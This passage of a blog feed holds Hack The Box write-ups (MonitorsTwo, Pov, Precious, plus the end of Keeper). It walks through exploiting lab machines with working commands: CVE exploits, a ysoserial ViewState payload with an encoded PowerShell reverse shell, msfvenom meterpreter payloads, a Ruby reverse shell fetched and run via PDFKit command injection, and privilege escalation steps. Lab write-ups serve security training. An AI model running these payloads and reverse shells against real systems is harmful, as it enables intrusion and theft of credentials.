+&lt;pre&gt;&lt;code&gt;puttygen key.putty -O private-openssh -o id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And use the key to SSH:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ssh root@keeper.htb -i id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>MonitorsTwo HTB Writeup</title><link>https://fuwari.vercel.app/posts/monitorstwo/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/monitorstwo/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We check the connection with the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.211 
+PING 10.10.11.211 (10.10.11.211) 56(84) bytes of data.
+64 bytes from 10.10.11.211: icmp_seq=1 ttl=63 time=264 ms
+
+--- 10.10.11.211 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 263.775/263.775/263.775/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We run our scan with nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.211 -oG scan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 22:35 AST
+Nmap scan report for 10.10.11.211
+Host is up (0.088s latency).
+Not shown: 61122 closed tcp ports (reset), 4411 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p22,80 -sVC 10.10.11.211                                  
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 22:37 AST
+Nmap scan report for 10.10.11.211 (10.10.11.211)
+Host is up (0.077s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Login to Cacti
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I scanned the system for the enumeration stage with nmap, dirb, traceroute, view page source, etc. but nothing useful. After checking the directory where dirb found the /document endpoint, spend some time on it but nothing changes, then start checking for cactus web interface vulnerabilities and here we go.&lt;/p&gt;
+&lt;h3&gt;Cacti CVE&lt;/h3&gt;
+&lt;p&gt;https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After seeing the correct way to use the exploit, we run it.&lt;/p&gt;
+&lt;p&gt;We listen on port 443:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443 
+Checking...
+The target is vulnerable. Exploiting...
+Bruteforcing the host_id and local_data_ids
+Bruteforce Success!!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;LinEnum&lt;/h3&gt;
+&lt;p&gt;Now we are going to see possible ways to elevate privileges, we will use LinEnum to have more information.&lt;/p&gt;
+&lt;p&gt;In our result we find this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We take advantage of this to elevate our privilege.&lt;/p&gt;
+&lt;h3&gt;Binario capsh&lt;/h3&gt;
+&lt;p&gt;We execute it inside the /sbin/ directory:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./capsh --gid=0 --uid=0 --
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;here you have more information about this –&amp;gt; capsh&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;It looks like we’re in a docker container, so let’s try to see the contents of a database we found before:&lt;/p&gt;
+&lt;h3&gt;Run Mysql to find credentials&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;mysql --host=db --user=root --password=root cacti -e &quot;SELECT * FROM user_auth&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In user marcus we have a hash, we will use john to see what it is.&lt;/p&gt;
+&lt;h3&gt;Cracking Password con john&lt;/h3&gt;
+&lt;p&gt;We save it in an h.txt file and execute it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;john h.txt --wordlist=/usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;SSH Conect&lt;/h3&gt;
+&lt;p&gt;We connect via SSH:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh marcus@10.10.11.211
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;After running LinEnum again, we see that the machine hosts a docker:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;marcus@monitorstwo:~$ docker --version
+Docker version 20.10.5+dfsg1, build 55c4c88
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;CVE-2021-41091&lt;/h3&gt;
+&lt;p&gt;After searching the Internet we found an exploit. CVE-2021-41091&lt;/p&gt;
+&lt;p&gt;We pass the exploit to our victim machine.&lt;/p&gt;
+&lt;p&gt;Let’s go to the docker container that we previously had as root:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd /bin
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We assign these permissions to bash.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod u+s /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we run the exploit on the victim machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We enter the path indicated by the exploit and execute it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./bin/bash -p
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Pov HTB Writeup</title><link>https://fuwari.vercel.app/posts/pov/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/pov/</guid><description>Medium Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We start our scans with nmap.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 3000 -Pn -n -vvv 10.10.11.251 -oG nmap 
+
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 127
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p80 -sVC 10.10.11.251 -oN Ports
+
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: pov.htb
+|_http-server-header: Microsoft-IIS/10.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;http&lt;/td&gt;
+&lt;td&gt;Microsoft IIS httpd&lt;/td&gt;
+&lt;td&gt;10.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Solo encontramos un puerto, que en este caso es una Web:&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We searched the site but found nothing interesting.&lt;/p&gt;
+&lt;h3&gt;Searching Subdomains&lt;/h3&gt;
+&lt;p&gt;We do fuzzing of subdomains:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ffuf -u http://10.10.11.251 -H &quot;Host: FUZZ.pov.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We found a subdomain called &lt;code&gt;dev.pov.htb&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If we investigate a little the page, we can see that in several parts it mentions ASP.NET, which already makes us clear that the page is made in this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In the download cv button we can see this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We send the request to the burpsuite&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If we notice in the &lt;code&gt;file&lt;/code&gt; parameter is calling the pdf of the CV&lt;/p&gt;
+&lt;h3&gt;Directory Traversal&lt;/h3&gt;
+&lt;p&gt;We can try to see the &lt;code&gt;etc/hosts&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;there is a file called &lt;code&gt;web.config&lt;/code&gt;, which may be of interest:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Ysoserial&lt;/h3&gt;
+&lt;p&gt;We are going to generate a payload with the Ysoserial tool which allows us to create them in .NET:
+https://github.com/pwntester/ysoserial.net&lt;/p&gt;
+&lt;p&gt;We use the base64 powershell:
+https://www.revshells.com/&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We run this from a windows machine to create the string that we are going to send to the victim machine:&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;./ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; --path=&quot;/portfolio&quot; -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We insert our payload to the &lt;code&gt;VIEWSTATE&lt;/code&gt; parameter, as follows:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I am listening on port 9001:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo rlwrap -cAr nc -lvnp 9001 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After searching in different machine paths:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Path                    
+----                    
+C:\Users\sfitz\Documents
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;we can see an xml file containing the following:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&amp;gt;
+  &amp;lt;Obj RefId=&quot;0&quot;&amp;gt;
+    &amp;lt;TN RefId=&quot;0&quot;&amp;gt;
+      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;
+      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
+    &amp;lt;/TN&amp;gt;
+    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;
+    &amp;lt;Props&amp;gt;
+      &amp;lt;S N=&quot;UserName&quot;&amp;gt;alaading&amp;lt;/S&amp;gt;
+      &amp;lt;SS N=&quot;Password&quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&amp;lt;/SS&amp;gt;
+    &amp;lt;/Props&amp;gt;
+  &amp;lt;/Obj&amp;gt;
+&amp;lt;/Objs&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I will use the &lt;code&gt;Import-CliXml&lt;/code&gt; PowerShell command to read the file and obtain the password in plain text&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$cred = Import-CliXml -Path connection.xml
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;$cred.GetNetworkCredential().Password
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we bring the runas to the victim machine:&lt;/p&gt;
+&lt;p&gt;https://github.com/antonioCoco/RunasCs&lt;/p&gt;
+&lt;p&gt;We create an smb server to pass this file to the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo impacket-smbserver share -smb2support /tmp/share -user test -password test 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;create a tmp folder in &lt;code&gt;C:\&lt;/code&gt; on the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;net use n: \\10.10.14.109\share /user:test test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;copy n:\RunasCs.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I run the runas:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.109:4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we are listening:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rlwrap -cAr nc -lnvp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;from the powershell we can see this &lt;code&gt;priv&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;What is SeDebugPrivilege?&lt;/h3&gt;
+&lt;p&gt;he SeDebugPrivilege in Windows allows a user to perform system-level debugging. In simple terms, with this privilege, a user can:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Access all system processes:
+Including those that are normally protected and inaccessible, such as operating system processes and critical services.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Modify or terminate protected processes:
+The user can terminate processes that standard users would not normally be able to stop.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Read and write to the memory of any process:
+This includes the ability to inject code or make real-time modifications to running processes.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This privilege is very powerful and is usually reserved for system accounts and administrators because it can be used to bypass almost all security measures of the operating system.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/13.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We create a file with msfvenom:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.109 LPORT=6969 -f exe -o platanoo.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We pass the file back to the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo impacket-smbserver share -smb2support /tmp/share -user test -password test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;net use n: \\10.10.14.109\share /user:test test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;copy n:\platanoo.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we are now listening to the meterpreter:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfconsole
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; use exploit/multi/handler
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;set LHOST tun0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;set LPORT 6969
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;run
+[*] Started reverse TCP handler on 10.10.14.109:6969 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we run the .exe on the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./platanoo.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/14.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We will migrate to this process&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 552
+[*] Migrating from 2032 to 552...
+[*] Migration completed successfully.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Precious HTB Writeup</title><link>https://fuwari.vercel.app/posts/precious/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/precious/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Precious is an easy linux machine created by Nauten on Hack the Box that features a web server that uses a version of PDFKit that is vulnerable to CVE-2022-25765, which can be exploited to execute commands as the user ruby. Within this user’s home directory we find a folder containing a configuration file with the credentials for another user by the name of henry. As henry, we can run a particular script as root via the sudo command. This script is vulnerable to a form of YAML deserialization, which leads us to code execution as root.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;Let’s first set up our environment and run a TCP port.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
+export rhost=&quot;10.10.11.189&quot; # Target IP address
+export lhost=&quot;10.10.14.4&quot; # Your VPN IP address
+echo rhost=$rhost &amp;gt;&amp;gt; .env
+echo lhost=$lhost &amp;gt;&amp;gt; .env
+. ./.env &amp;amp;&amp;amp; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv $rhost -oG nmap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The open TCP ports reported in the scan include:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;ssh&lt;/td&gt;
+&lt;td&gt;OpenSSH&lt;/td&gt;
+&lt;td&gt;8.4p1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;nginx&lt;/td&gt;
+&lt;td&gt;1.18.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;The scan also reports that port 80 responds with a redirection to http://precious.htb/ . Let&apos;s add this hostname to our /etc/hosts`file.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We’ll begin by visiting http://precious.htb/ in our favorite browser.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The page apparently has some functionality that will convert the content at a given URL to a PDF document.&lt;/p&gt;
+&lt;h3&gt;PDF Generator&lt;/h3&gt;
+&lt;p&gt;Upon sending a dummy URL through the web form, we observe a request from our browser with BurpSuite.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The request just passes the submitted URL to the server. Let’s test this functionality on our own HTTP server.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
+mkdir share &amp;amp;&amp;amp; cd share
+echo &apos;&amp;lt;p&amp;gt;Hello!&amp;lt;/p&amp;gt;&apos; &amp;gt; index.html
+python3 -m http.server --bind $lhost 8080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
+curl -d &quot;url=http://$lhost:8080/&quot; http://precious.htb/ -o response.bin
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We get a request to our HTTP server and subsequently receive the PDF result.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+file response.bin # The response body is a PDF document
+xdg-open response.bin # Open the document
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The document contains the text “Hello!”, which is expected because that is the content we had on our site earlier. Checking the metadata of the document with exiftool, we find out that the Creator field mentions that the document was generated using a product identified as PDFKit v0.8.6.&lt;/p&gt;
+&lt;h3&gt;CVE-2022-25765&lt;/h3&gt;
+&lt;p&gt;After some research, we determine that this version of pdfkit is vulnerable to CVE-2022-25765, meaning we could potentially inject OS commands as explained here. Let’s try exploiting the bug to establish a reverse shell session with PwnCat. We’ll use a reverse shell written in Ruby because we know that Ruby is installed since PDFKit is written in Ruby.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
+mkdir -p share &amp;amp;&amp;amp; cd share
+rb=&quot;require &apos;socket&apos;;spawn(&apos;sh&apos;,[:in,:out,:err]=&amp;gt;TCPSocket.new(&apos;$lhost&apos;,8443))&quot;
+echo &quot;$rb&quot; &amp;gt; index.html # Write ruby reverse shell to web index
+python3 -m http.server --bind $lhost 8080 &amp;amp;&amp;gt;/dev/null &amp;amp; # Serve payload
+pwncat-cs -m linux -l $lhost 8443 # PwnCat listener | Install: `pip3 install pwncat-cs`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
+curl precious.htb -d &quot;url=http://%2520%60curl%20$lhost:8080|ruby%60&quot; # Trigger payload
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;Ruby&lt;/h3&gt;
+&lt;p&gt;Our reverse shell session is in the context of the user ruby. In this user’s home directory, we find the file ~/.bundle/config which contains potential credentials&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# ruby@precious.htb (PwnCat)
+find ~ -type f # We find a configuration file of sorts
+cat ~/.bundle/config # Let&apos;s read it
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The user henry, associated with the password Q3c1AqGHtoI0aXAYFH, is also present on the current machine with the same password.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
+pwncat-cs ssh://henry@precious.htb # password is Q3c1AqGHtoI0aXAYFH
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Henry&lt;/h3&gt;
+&lt;p&gt;As henry, we can execute a specific command as root via sudo.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# henry@precious.htb (SSH)
